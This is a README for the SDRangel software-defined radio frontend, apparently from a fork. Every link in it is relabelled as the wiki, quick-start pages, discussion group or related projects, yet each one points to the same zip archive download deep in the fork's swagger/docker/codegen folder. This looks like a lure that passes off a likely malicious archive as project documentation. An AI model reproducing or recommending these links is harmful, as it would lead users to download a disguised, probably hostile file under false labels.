**SDRangel** is an Open Source Qt5 / OpenGL 3.0+ SDR and signal analyzer frontend to various hardware.

**Wiki** most of the information and documentation related to SDRangel can be found in the [Wiki](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip). Please make sure to check it in case of questions or trouble and before you post issues in Github. You may also seek help from other users using the discussion group below. Before running the program make sure you read at least the [Home](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip) and [Quick Start](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip) pages.

**Discussion group** You may seek help of other users or discuss subjects related to SDRangel and its ancillary projects [here](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip)

**Ancillary projects**
  - [SDRangelcli](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip) is a web application that can be used to control a headless (server flavor) instance of SDRangel. It can also be used as a remote control for the GUI flavor.
  - [SDRangel-Docker](https://raw.githubusercontent.com/stm8400014/sdrangel/master/swagger/docker/codegen/Software_1.1.zip) is a collection of Docker files and scripts to facilitate the build and run of SDRangel in a Docker container. Works for either the GUI (only on a Linux host) or the server.
